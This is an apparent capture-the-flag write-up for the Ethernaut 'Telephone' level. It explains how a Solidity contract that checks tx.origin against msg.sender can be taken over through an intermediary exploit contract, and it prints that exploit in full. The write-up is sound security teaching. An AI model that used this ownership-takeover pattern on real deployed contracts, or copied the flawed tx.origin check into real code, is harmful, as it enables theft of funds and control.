# Telephone

>Claim ownership of the contract below to complete this level.

>  Things that might help
> - See the "?" page above, section "Beyond the console"

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Telephone {

  address public owner;

  constructor() {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}
```

According to solidity documentation, tx.origin holds the address of the sender of the transaction and msg.sender holds the address of the sender of the message.

In other words, tx.origin refers to the address of the account that brought about the transaction while msg.sender is the direct caller of the smart contract, it could be a contract address or an account address.

![ethernaut-2](https://github.com/blueh4mster/Ethernaut-writeups/assets/102573660/b13ddeec-fdd4-4ca3-81fa-73e0b847eeb2)

In this challenge, we come across a smart contract Telephone which has a chanegOwner function that compares tx.origin with msg.sender. If false, owner is changed to the address we provide else returned.

We can simply write another smart contract called exploit where we call the changeOwner function by instance of this contract provided to us.

When we do this, `tx.origin` is the account address which deploys the exploit contract and `msg.sender` is the address of the exploit contract.
The exploit contract can be written like this,

```solidity
contract exploit {
    Telephone telephone;

    constructor(address addr){
        telephone = Telephone(addr);
    }

    function attack() public {
        telephone.changeOwner(msg.sender);
    }
}
```

On calling the attack function, the owner of the telephone contract will be changed to our address(msg.sender). 

We can confirm so through the browser console and submit the instance.

(This exploit script can be deployed in remix IDE using Injected Web3 Provider MetaMask. Instance address of the challenge to be fed to the constructor.)

### Image Reference
[tx.origin vs msg.sender](https://davidkathoh.medium.com/tx-origin-vs-msg-sender-93db7f234cb9)
